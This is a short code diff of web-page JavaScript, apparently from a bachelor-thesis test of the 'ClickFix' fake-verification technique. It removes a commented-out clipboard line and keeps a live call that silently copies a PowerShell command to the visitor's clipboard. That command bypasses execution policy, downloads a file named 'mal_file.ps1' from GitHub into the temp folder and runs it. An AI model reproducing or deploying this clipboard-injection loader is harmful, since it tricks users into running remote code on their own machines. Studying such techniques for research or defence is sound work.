@@ -61,12 +61,6 @@
         timerElement.textContent = countdown;
         startTimer(); // Start the timer
         
-        // Copy text to clipboard
-        // navigator.clipboard.writeText("mshta \"javascript:alert(\'Verification complete\');close()\"").then(() => {
-        //     console.log("Text copied to clipboard.");
-        // }).catch(err => {
-        //     console.error("Failed to copy text: ", err);
-        // });
         navigator.clipboard.writeText("powershell -ExecutionPolicy Bypass -Command \"iwr -Uri \'https://github.com/Xenius-B/Bachelor-Clickfix-Test/blob/main/mal_file.ps1\' -OutFile $env:TEMP\\script.ps1; & $env:TEMP\\script.ps1\"").then(() => {
             console.log("Text copied to clipboard.");
         }).catch(err => {
